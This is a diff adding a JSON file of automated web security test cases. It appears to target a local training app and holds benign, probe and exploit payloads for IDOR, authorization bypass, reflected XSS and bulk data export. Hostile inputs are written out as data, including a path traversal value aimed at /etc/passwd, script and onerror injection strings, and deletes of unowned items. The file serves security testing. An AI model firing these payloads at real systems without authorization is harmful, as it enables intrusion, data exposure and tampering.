@@ -1,0 +1,848 @@
+{
+  "test_cases": [
+    {
+      "id": "h1-tc1",
+      "hypothesis_id": "h1",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/api/{resource}",
+      "parameter": "resource",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "Products"
+            }
+          ],
+          "description": "Baseline request using known resource 'Products'",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "Users"
+            }
+          ],
+          "description": "Request another valid resource 'Users' to compare access control behavior",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "SecurityAnswers"
+            }
+          ],
+          "description": "Request potentially sensitive resource 'SecurityAnswers' to detect IDOR",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi... (JWT observed in Authorization header)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Use observed JWT for authenticated endpoints when available",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi... (JWT observed in Authorization header)"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Any payload returns a status code in [200,401,403,404] and codes differ between payloads",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404,
+              401
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Compare baseline body length to probe/exploit; flag if difference >=30%",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "All requests are safe GETs; include Authorization header when JWT present to access protected resources",
+      "tags": [
+        "idor",
+        "enumeration"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "h2-tc1",
+      "hypothesis_id": "h2",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/api/Products/{id}",
+      "parameter": "id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "1"
+            },
+            {
+              "location": "query",
+              "value": "d=Tue Dec 02 2025"
+            }
+          ],
+          "description": "Baseline product id=1 with existing date query",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "2"
+            },
+            {
+              "location": "query",
+              "value": "d=Tue Dec 02 2025"
+            }
+          ],
+          "description": "Probe with id=2 to compare status and size",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "24"
+            },
+            {
+              "location": "query",
+              "value": "d=Tue Dec 02 2025"
+            }
+          ],
+          "description": "Probe with id=24 (observed in API) to detect inconsistent access controls",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Include observed JWT for authenticated endpoints",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If responses across ids return differing status codes among [200,401,403,404] mark as potential IDOR",
+          "threshold": {
+            "expected_codes": [
+              200,
+              403,
+              404,
+              401
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body length for any id differs from baseline by >=25% flag as content difference",
+          "threshold": {
+            "body_length_delta_pct": 25.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "Authenticated GETs only; reuse observed JWT",
+      "tags": [
+        "idor",
+        "products"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "h3-tc1",
+      "hypothesis_id": "h3",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/api/Products/{id}",
+      "parameter": "d",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "1"
+            },
+            {
+              "location": "query",
+              "value": "d=Tue Dec 02 2025"
+            }
+          ],
+          "description": "Baseline with original 'd' query",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "1"
+            },
+            {
+              "location": "query",
+              "value": "d=2025-12-02T00:00:00Z"
+            }
+          ],
+          "description": "Probe with ISO date format to see behavior change",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "1"
+            },
+            {
+              "location": "query",
+              "value": "d=../../../etc/passwd"
+            }
+          ],
+          "description": "Unsafe probe with path-like value to detect timing or response differences (low confidence)",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Include observed JWT for authenticated endpoints",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "Compare baseline body length to probe/exploit; flag if difference >=30%",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        },
+        {
+          "signal": "timing_anomaly",
+          "condition": "If response time for any manipulated 'd' exceeds baseline by >=1500ms flag timing anomaly",
+          "threshold": {
+            "timing_ms": 1500
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Use caution with exploit tier value; these are safe GETs but may be odd inputs",
+      "tags": [
+        "timing",
+        "response-diff"
+      ],
+      "estimated_duration": 45
+    },
+    {
+      "id": "h4-tc1",
+      "hypothesis_id": "h4",
+      "base_url": "http://localhost:3000",
+      "method": "GET",
+      "endpoint": "/api/Challenges",
+      "parameter": "name",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "name=Score Board"
+            }
+          ],
+          "description": "Baseline using observed 'Score Board'",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "name=<script>1</script>"
+            }
+          ],
+          "description": "Probe injecting harmless script tag to detect reflection",
+          "content_type": "application/json",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "name=\"><img src=x onerror=fetch('http://localhost:3000')>"
+            }
+          ],
+          "description": "DOM-reflection styled payload to detect immediate reflection in HTML responses",
+          "content_type": "application/json",
+          "header": []
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "If injected 'name' value appears verbatim in response body or HTML fragment mark as reflected input",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body length changes by >=20% compared to baseline when 'name' modified flag change",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 15
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "All GETs; exploit payloads are lightweight probes for reflection only",
+      "tags": [
+        "xss",
+        "reflected"
+      ],
+      "estimated_duration": 30
+    },
+    {
+      "id": "h11-tc1",
+      "hypothesis_id": "h11",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/BasketItems/",
+      "parameter": "ProductId",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"1\",\"BasketId\":\"6\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Baseline create basket item with ProductId=1",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"2\",\"BasketId\":\"6\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Probe using different ProductId to observe authz/validation",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"24\",\"BasketId\":\"6\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Probe with ProductId=24 (observed) to check access control and potential IDOR",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Authenticate and include JWT in Authorization header",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If responses return differing status codes among [201,401,403,404] between payloads flag potential access control issue",
+          "threshold": {
+            "expected_codes": [
+              201,
+              403,
+              404,
+              401
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body length differs from baseline by >=25% for any payload flag content difference",
+          "threshold": {
+            "body_length_delta_pct": 25.0
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "State-changing POSTs require Authorization; keep requests limited per safety config",
+      "tags": [
+        "idor",
+        "basket"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "h12-tc1",
+      "hypothesis_id": "h12",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/api/BasketItems/",
+      "parameter": "BasketId",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"1\",\"BasketId\":\"6\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Baseline using own BasketId=6",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"1\",\"BasketId\":\"7\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Using another observed BasketId=7 to check authorization enforcement",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"ProductId\":\"1\",\"BasketId\":\"9999\",\"quantity\":\"1\"}"
+            }
+          ],
+          "description": "Using a likely-unowned BasketId to detect authz bypass",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Authenticate as test user and include JWT in Authorization header",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        },
+        {
+          "type": "session_state",
+          "description": "Ensure session corresponds to the test user owning baseline BasketId"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If non-own BasketId returns success code (201) while baseline succeeds mark as authz bypass",
+          "threshold": {
+            "expected_codes": [
+              201,
+              403,
+              401,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response content differs by >=30% compared to baseline when BasketId varies flag change",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "State-changing; respect max_requests and do not attempt destructive actions",
+      "tags": [
+        "authz",
+        "basket"
+      ],
+      "estimated_duration": 150
+    },
+    {
+      "id": "h16-tc1",
+      "hypothesis_id": "h16",
+      "base_url": "http://localhost:3000",
+      "method": "DELETE",
+      "endpoint": "/api/BasketItems/{id}",
+      "parameter": "id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "9"
+            }
+          ],
+          "description": "Baseline delete own BasketItem id=9 (if owned)",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "7"
+            }
+          ],
+          "description": "Attempt delete of another observed id=7 to test authorization",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "path",
+              "value": "9999"
+            }
+          ],
+          "description": "Attempt delete with likely-unowned id to detect unauthorized deletion behavior",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Authenticate and include JWT in Authorization header",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        },
+        {
+          "type": "csrf_token",
+          "description": "If CSRF token required by server include token from form or cookie; otherwise proceed"
+        },
+        {
+          "type": "session_state",
+          "description": "Ensure session corresponds to test user and owns baseline id when possible"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Baseline vs probe/exploit status codes differ; success (200/204) for probe indicates possible authz bypass",
+          "threshold": {
+            "expected_codes": [
+              200,
+              204,
+              403,
+              401
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response content after delete differs from baseline by >=30% indicating state change",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "all",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "DELETE is state-changing and potentially destructive; adhere to max_requests and avoid repeated deletes",
+      "tags": [
+        "authz",
+        "delete"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "h36-tc1",
+      "hypothesis_id": "h36",
+      "base_url": "http://localhost:3000",
+      "method": "POST",
+      "endpoint": "/rest/user/data-export",
+      "parameter": "format",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"format\":\"1\"}"
+            }
+          ],
+          "description": "Baseline export request format=1 as observed",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"format\":\"2\"}"
+            }
+          ],
+          "description": "Change format to probe for larger payloads",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"format\":\"zip\"}"
+            }
+          ],
+          "description": "Use alternate format value to trigger different export behavior",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Authorization",
+              "header_value": "Bearer eyJ0eXAiOiJKV1Qi..."
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "jwt_refresh",
+          "description": "Authenticated user required; include JWT in Authorization header",
+          "bind_to": "Authorization: Bearer eyJ0eXAiOiJKV1Qi..."
+        },
+        {
+          "type": "csrf_token",
+          "description": "Include CSRF token if present in forms"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "If export payload increases by >=50% compared to baseline mark as bulk data exposure",
+          "threshold": {
+            "body_length_delta_pct": 50.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If endpoint returns success codes (200/202) for export requests mark as successful export",
+          "threshold": {
+            "expected_codes": [
+              200,
+              202,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "all",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 3
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "Data export may return large payloads; limit to max_requests=3 and ensure authenticated context",
+      "tags": [
+        "sensitive-data",
+        "export"
+      ],
+      "estimated_duration": 180
+    }
+  ]
+}
